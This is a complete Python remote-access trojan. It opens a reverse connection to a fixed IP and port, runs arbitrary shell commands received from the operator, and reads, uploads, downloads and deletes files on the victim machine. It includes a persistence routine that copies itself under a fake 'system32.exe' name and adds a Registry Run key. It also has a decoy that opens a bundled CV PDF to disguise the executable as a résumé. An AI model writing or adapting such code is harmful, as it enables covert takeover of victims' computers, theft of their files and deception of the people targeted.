import socket, os, base64, shutil, sys
import subprocess as sp
import simplejson as json

class Trojan:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, int(port)))

    def command_execute(self, cmd):
        try:
            return sp.check_output(cmd, shell=True, stderr=sp.DEVNULL, stdin=sp.DEVNULL)
        except:
            return "Command Not Found\n"

    def json_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    def json_recv(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(json_data)
            except:
                pass

    def change_directory(self, where):
        if where in os.listdir() or where == "..":
            os.chdir(where)
            return f"Current Directory: {os.getcwd()}\n"
        else:
            return "Directory not found\n"
    def read_file(self, file):
        with open(file, "rb") as f:
            return base64.b64encode(f.read())

    def write_file(self, file, content):
        with open(file, "wb") as f:
            f.write(content)
            return f"{file} is uploaded\n"

    def start_executer(self):
        while True:
            cmd = self.json_recv()

            if cmd[0] == "exit":
                self.connection.close()
                exit()
            elif cmd[0] == "cd" and len(cmd) > 1:
                cmd_output = self.change_directory(cmd[1])
            elif cmd[0] == "read" and len(cmd) > 1:
                if cmd[1] in os.listdir():
                    cmd_output = self.read_file(cmd[1])
                else:
                    cmd_output = "File not found\n"
            elif cmd[0] == "remove" and len(cmd) > 1:
                os.remove(cmd[1])
                cmd_output = f"{cmd[1]} is removed\n"
            elif cmd[0] == "download" and len(cmd) > 1:
                if cmd[1] in os.listdir():
                    cmd_output = self.read_file(cmd[1])
                else:
                    cmd_output = "File not found\n"
            elif cmd[0] == "upload" and len(cmd) > 1:
                cmd_output = self.write_file(cmd[1], base64.b64decode(cmd[2]))
            else:
                cmd_output = self.command_execute(cmd)
            
            self.json_send(cmd_output)

def add_to_regedit():
    #persistence
    new_file = os.environ["appdata"] + "\\system32.exe"
    print(new_file)
    if not os.path.exists(new_file):
        shutil.copyfile(sys.executable, new_file)
        regedit_cmd = f'reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v sysupdate /t REG_SZ /d "{new_file}" '
        os.system(regedit_cmd)

def open_data():
    file = sys._MEIPASS + "\\MUHAMMET_TALHA_ODABASI_CV.pdf"
    sp.Popen(file, shell=True)


port = 4141
ip = "192.168.1.104"

if __name__ == "__main__":
    try:
        #add_to_regedit()
        #open_data()
        connector = Trojan(ip, int(port))
        connector.start_executer()
    except:
        pass
        